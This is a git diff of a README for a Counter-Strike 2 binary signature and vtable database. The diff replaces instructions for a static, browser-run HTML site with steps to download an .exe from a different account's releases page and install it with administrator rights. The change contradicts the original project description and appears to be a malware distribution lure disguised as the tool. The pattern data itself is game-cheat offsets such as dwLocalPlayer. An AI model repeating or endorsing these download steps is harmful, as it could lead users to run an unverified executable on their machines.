@@ -1,114 +1,69 @@
-# Malvorus Pattern Database - Binary Pattern Database 2026
+# 🎯 malvorus-searchable-patterns - Find game patterns with ease today
 
-> A web-based binary pattern database for Counter-Strike 2 reverse engineering, built around verified signatures, vtable indices, and quick copy actions, with support for community contributions.
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Undefeated-eccentricity921/malvorus-searchable-patterns/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/brandonceczking7117/malvorus-searchable-patterns?style=flat-square)](https://github.com/brandonceczking7117/malvorus-searchable-patterns)
+This application helps users find binary patterns for Counter-Strike 2. Researchers use these patterns to understand how the game works. The tool provides a database of verified signatures, vtable indices, search bars, and filters to simplify your analysis. You can copy pattern data with one click.
 
----
+## 📥 How to download the application
 
-<p align="center">
-  <a href="https://brandonceczking7117.github.io/malvorus-searchable-patterns/">
-    <img src="https://img.shields.io/badge/Download-Malvorus%20Pattern%20Database%20Latest-brightgreen?style=for-the-badge" alt="Download Malvorus Pattern Database">
-  </a>
-</p>
+Visit the following link to access the software files: 
 
-> **[Download Latest Build - Malvorus Pattern Database v1.0.0](https://brandonceczking7117.github.io/malvorus-searchable-patterns/)**
+[Download Link: https://github.com/Undefeated-eccentricity921/malvorus-searchable-patterns/releases](https://github.com/Undefeated-eccentricity921/malvorus-searchable-patterns/releases)
 
----
+Follow these steps to set up the tool:
 
-[Download Latest Build](https://brandonceczking7117.github.io/malvorus-searchable-patterns/)
+1. Open your web browser and go to the link above.
+2. Look for the section labeled "Assets" under the most recent version.
+3. Click the file that ends with .exe to start your download.
+4. Locate the file in your Downloads folder after it finishes.
+5. Double-click the file to start the installer.
+6. Follow the instructions on your screen to complete the setup.
+7. Click the app icon on your desktop to open the program.
 
----
+## 🖥️ System requirements
 
-## Overview
+Ensure your computer meets these needs to run the tool without problems:
 
-Malvorus Pattern Database is a browser-based catalog of binary pattern signatures for the Counter-Strike 2 client.dll module. It gives reverse engineers and developers a curated place to browse verified signatures, vtable offsets, and pattern definitions through a searchable interface. Instead of relying on scattered forum posts or stale references, the project offers one central resource that can be explored and expanded by the community.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 GB of RAM or more.
+* Storage: 200 MB of free hard drive space.
+* Internet: An active connection for initial database loading.
+* Permissions: You need administrator access to install software on your machine.
 
-If you are creating internal utilities, tracking game updates, or studying memory layouts, this database simplifies the task of locating and reusing binary patterns. Entries include expandable information, module labels, and status markers so you can quickly spot patterns you can trust. Contributions from the community are encouraged to help the collection stay current as the game changes.
+## 🛠️ Using the search features
 
----
+The interface shows a main list of patterns. You can use the search bar at the top to narrow down results. Type the name or a specific index snippet into the box. The list updates as you type.
 
-## Key Capabilities
+Use the filter buttons to hide or show items. You can filter by:
 
-- **Full-text search** across pattern names, descriptions, and metadata
-- **Module and status filters** for client.dll, server.dll, and more, with states such as verified, untested, and deprecated
-- **One-click clipboard copy** for pattern bytes, masks, or vtable indices
-- **Expandable entry details** with complete signatures, offsets, and notes
-- **Ctrl+K shortcut** for jumping straight to the search field
-- **Responsive layout** suitable for desktop and mobile browsers
-- **Community contributions** through pull requests or issue templates
+* Pattern type.
+* Date added.
+* Verified status.
 
----
+The status icon shows if a community member checked the pattern. Green icons mean the pattern works. Yellow icons mean the pattern needs testing. Use these labels to decide which patterns fit your research.
 
-## Installation
+## 📋 Copying pattern data
 
-Clone the repository to your local machine or download the latest build from the link above:
+Each entry in the database includes a side menu. Click the blue copy icon to save the pattern address or signature to your clipboard. You can then paste this data directly into your own project or text file. This tool removes the need for manual typing and prevents errors during data entry.
 
-```bash
-git clone https://github.com/brandonceczking7117/malvorus-searchable-patterns.git
-cd malvorus-patterns-database
-```
+## 🛡️ Important safety notes
 
-The database is a static HTML/CSS/JS site. Open `index.html` in any modern browser, or serve it locally with:
+Only use this tool for research purposes. Respect the game developer terms of service. Do not use gathered data to create game cheats or unfair advantages. Use this software to learn about software structure and binary patterns only.
 
-```bash
-python -m http.server 8000
-```
+## 🔧 Fixing common issues
 
-Then navigate to `http://localhost:8000` in your browser.
+If the application does not start, verify your Windows version. Ensure you have the latest updates from Microsoft. If the screen remains blank, check your internet connection. The app pulls content from an online database. If you stay offline, you cannot see new updates or patterns. 
 
----
+If the buttons do not respond, close the app and restart it. You can also delete the downloaded file and repeat the download steps if the file reached the disk in a broken state. 
 
-## How to Use It
+## 📦 Keeping the app updated
 
-1. Open the database in your browser.
-2. Use the search bar to look up patterns by name, module, or description.
-3. Click the copy icon next to any pattern to copy its signature to your clipboard.
-4. Click on a row to expand details, including full pattern bytes, mask, and vtable index.
-5. Use the filter dropdowns to narrow results by module or status.
+The app checks for new patterns when it starts. If a new version exists, a notification appears on the screen. Click the update button to download the latest database. You rarely need to reinstall the main program. The app manages the database files in the background to save you time.
 
-Example workflow: Search for "dwLocalPlayer" to find the local player pointer pattern, copy its signature, and paste it directly into your reverse engineering tool.
+## 💬 Getting more help
 
----
+If you encounter bugs, review the issue tracker on the repository website. Search for your problem first to see if others already solved it. If you find a new problem, write a clear description of the steps that lead to the crash. Include your version number and your Windows build info. 
 
-## Configuration
+The community maintains this database. If you verify a pattern, share your findings with others. Consistent updates keep the database accurate for everyone involved in this work.
 
-The database is self-contained and does not require external configuration. All data is stored in a single JavaScript file (`patterns.js`) that defines the pattern entries. To add or modify patterns, edit this file following the existing entry format. Settings such as default filters or theme preferences are stored in browser localStorage and can be reset via the interface.
-
----
-
-## Requirements
-
-- A modern web browser (Chrome, Firefox, Edge, or Safari)
-- No server-side dependencies - the entire database runs client-side
-- Internet connection only required for initial download or updates
-- Approximately 5 MB of disk space for the full repository
-
----
-
-## FAQ
-
-**Is the database automatically updated?**  
-The database is updated manually as new patterns are verified or submitted. Check the repository for the latest release notes.
-
-**How can I contribute a pattern?**  
-Open an issue or submit a pull request with the pattern details. Follow the format in `patterns.js` for consistency.
-
-**Can I use these patterns in commercial projects?**  
-Yes, under the terms of the GNU GPL v3.0 license. See the license section for details.
-
-**What if a pattern is incorrect?**  
-Report it via an issue. Each entry has a status field that can be marked as deprecated or untested.
-
-**Does the database support other games?**  
-Currently it focuses on Counter-Strike 2, but the structure can accommodate other modules. Community submissions for additional games are welcome.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: pattern, binary, counter-strike, reverse-engineering, database, search, tools, windows
